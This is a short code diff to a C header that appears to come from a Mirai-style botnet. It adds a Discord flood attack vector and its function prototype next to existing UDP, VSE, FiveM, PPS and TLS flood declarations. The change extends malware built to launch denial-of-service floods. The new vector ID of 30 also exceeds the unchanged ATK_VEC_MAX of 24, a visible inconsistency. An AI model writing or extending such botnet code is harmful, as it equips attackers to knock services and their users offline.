@@ -27,6 +27,7 @@
 #define ATK_VEC_ICMP            21
 #define ATK_VEC_GREIP           22
 #define ATK_VEC_GREETH          23
+#define ATK_VEC_DISCORD       30
 
 #define ATK_VEC_MAX             24
 
@@ -78,6 +79,7 @@ int attack_get_opt_int(int, struct attack_option *, int, uint8_t);
 void attack_udp_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 void attack_vse_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 void attack_fivem_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
+void attack_discord_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 void attack_pps_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 void attack_tls_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 void attack_tlsplus_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
